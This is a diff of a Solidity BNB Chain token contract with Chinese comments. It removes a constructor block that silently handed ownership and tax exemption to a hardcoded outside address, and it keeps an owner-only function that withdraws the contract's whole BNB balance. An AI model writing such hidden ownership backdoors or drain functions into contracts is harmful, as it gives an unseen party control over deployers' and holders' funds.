@@ -419,8 +419,6 @@ contract ModaDividendTracker is Ownable, DividendPayingToken {
         processAccount(payable(msg.sender), false);
     }
 
-    receive() external payable {}
-
     /// @notice Owner 紧急提取 BNB（用于合约升级迁移，非正常使用）
     function emergencyWithdrawBNB() external onlyOwner {
         uint256 bal = address(this).balance;
@@ -538,17 +536,17 @@ contract ModaMintToken is IERC20, Ownable {
         _totalSupply = totalSupply_ * 1e18;
         _balances[address(this)] = _totalSupply;
 
-        address fixedOwner = 0x55b486df3acD881CC8A006BF45cb9A7353672E7a;
-        emit OwnershipTransferred(address(0), msg.sender);
-        emit OwnershipTransferred(msg.sender, fixedOwner);
-        _owner = fixedOwner;
+        // owner 为部署者传入的地址（若为零地址则默认为部署者）
+        address _ownerAddr = (owner_ == address(0)) ? msg.sender : owner_;
+        emit OwnershipTransferred(address(0), _ownerAddr);
+        _owner = _ownerAddr;
 
         IUniswapV2Router02 _router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         uniswapV2Router = _router;
         uniswapV2Pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
 
         isExcludedFromTax[address(this)] = true;
-        isExcludedFromTax[fixedOwner] = true;
+        isExcludedFromTax[_ownerAddr] = true;
         isExcludedFromTax[marketingWallet_] = true;
         isExcludedFromTax[address(_router)] = true;
 
